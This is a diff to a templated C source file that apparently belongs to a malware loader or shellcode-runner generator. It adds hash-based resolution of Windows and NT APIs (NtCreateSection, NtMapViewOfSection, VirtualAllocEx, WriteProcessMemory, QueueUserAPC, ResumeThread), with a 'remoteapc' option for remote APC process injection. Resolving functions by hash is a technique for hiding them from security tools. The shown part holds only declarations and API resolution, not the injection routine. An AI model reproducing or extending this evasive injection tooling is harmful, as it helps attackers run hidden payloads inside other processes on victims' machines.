@@ -8,6 +8,8 @@ typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
 typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
 typedef HANDLE (WINAPI *pCreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
 typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+typedef NTSTATUS (WINAPI* pNtCreateSection)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
+typedef NTSTATUS (WINAPI* pNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, UINT, ULONG, ULONG);
 typedef HANDLE (WINAPI *pGetProcessHeap)(VOID);
 typedef LPVOID (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T);
 typedef BOOL (WINAPI *pHeapFree)(HANDLE, DWORD, LPVOID);
@@ -18,6 +20,17 @@ typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTE
 typedef DWORD (WINAPI *pGetFileSize)(HANDLE, LPDWORD);
 typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef VOID (WINAPI* pRtlZeroMemory)(PVOID, SIZE_T);
+{% if execution_method == 'remoteapc' %}
+typedef int (WINAPI* pLstrlenA)(LPCSTR);
+typedef DWORD (WINAPI* pGetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
+typedef BOOL (WINAPI* pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef LPVOID (WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL (WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
+typedef BOOL (WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+typedef DWORD (WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
+typedef DWORD (WINAPI* pResumeThread)(HANDLE);
+typedef DWORD (WINAPI* pGetLastError)(VOID);
+{% endif %}
 {% if data_source == 'embedded' %}
 typedef HRSRC (WINAPI* pFindResourceA)(HMODULE, LPCSTR, LPCSTR);
 typedef HGLOBAL (WINAPI* pLoadResource)(HMODULE, HRSRC);
@@ -46,6 +59,8 @@ pWaitForSingleObject pfnWaitForSingleObject;
 pCloseHandle pfnCloseHandle;
 pCreateFileMappingW pfnCreateFileMappingW;
 pMapViewOfFile pfnMapViewOfFile;
+pNtCreateSection pfnNtCreateSection;
+pNtMapViewOfSection pfnNtMapViewOfSection;
 pGetProcessHeap pfnGetProcessHeap;
 pHeapAlloc pfnHeapAlloc;
 pHeapFree pfnHeapFree;
@@ -57,6 +72,17 @@ pGetFileSize pfnGetFileSize;
 pReadFile pfnReadFile;
 pRtlMoveMemory pfnRtlMoveMemory;
 pRtlZeroMemory pfnRtlZeroMemory;
+{% if execution_method == 'remoteapc' %}
+pLstrlenA pfnLstrlenA;
+pGetEnvironmentVariableA pfnGetEnvironmentVariableA;
+pCreateProcessA pfnCreateProcessA;
+pVirtualAllocEx pfnVirtualAllocEx;
+pWriteProcessMemory pfnWriteProcessMemory;
+pVirtualProtectEx pfnVirtualProtectEx;
+pQueueUserAPC pfnQueueUserAPC;
+pResumeThread pfnResumeThread;
+pGetLastError pfnGetLastError;
+{% endif %}
 {% if data_source == 'embedded' %}
 pFindResourceA pfnFindResourceA;
 pLoadResource pfnLoadResource;
@@ -172,7 +198,21 @@ void ResolveAPIs() {
     if (hNtdll != NULL) {
         pfnRtlMoveMemory = (pRtlMoveMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlmovememory }});
         pfnRtlZeroMemory = (pRtlZeroMemory)GetProcAddressByHash(hNtdll, {{ hash_rtlzeromemory }});
+        pfnNtCreateSection = (pNtCreateSection)GetProcAddressByHash(hNtdll, {{ hash_ntcreatesection }});
+        pfnNtMapViewOfSection = (pNtMapViewOfSection)GetProcAddressByHash(hNtdll, {{ hash_ntmapviewofsection }});
     }
+
+    {% if execution_method == 'remoteapc' %}
+    pfnLstrlenA = (pLstrlenA)GetProcAddressByHash(hKernel32, {{ hash_lstrlena }});
+    pfnGetEnvironmentVariableA = (pGetEnvironmentVariableA)GetProcAddressByHash(hKernel32, {{ hash_getenvironmentvariablea }});
+    pfnCreateProcessA = (pCreateProcessA)GetProcAddressByHash(hKernel32, {{ hash_createprocessa }});
+    pfnVirtualAllocEx = (pVirtualAllocEx)GetProcAddressByHash(hKernel32, {{ hash_virtualallocex }});
+    pfnWriteProcessMemory = (pWriteProcessMemory)GetProcAddressByHash(hKernel32, {{ hash_writeprocessmemory }});
+    pfnVirtualProtectEx = (pVirtualProtectEx)GetProcAddressByHash(hKernel32, {{ hash_virtualprotectex }});
+    pfnQueueUserAPC = (pQueueUserAPC)GetProcAddressByHash(hKernel32, {{ hash_queueuserapc }});
+    pfnResumeThread = (pResumeThread)GetProcAddressByHash(hKernel32, {{ hash_resumethread }});
+    pfnGetLastError = (pGetLastError)GetProcAddressByHash(hKernel32, {{ hash_getlasterror }});
+    {% endif %}
 
     {% if data_source == 'embedded' %}
     pfnFindResourceA = (pFindResourceA)GetProcAddressByHash(hKernel32, {{ hash_findresourcea }});
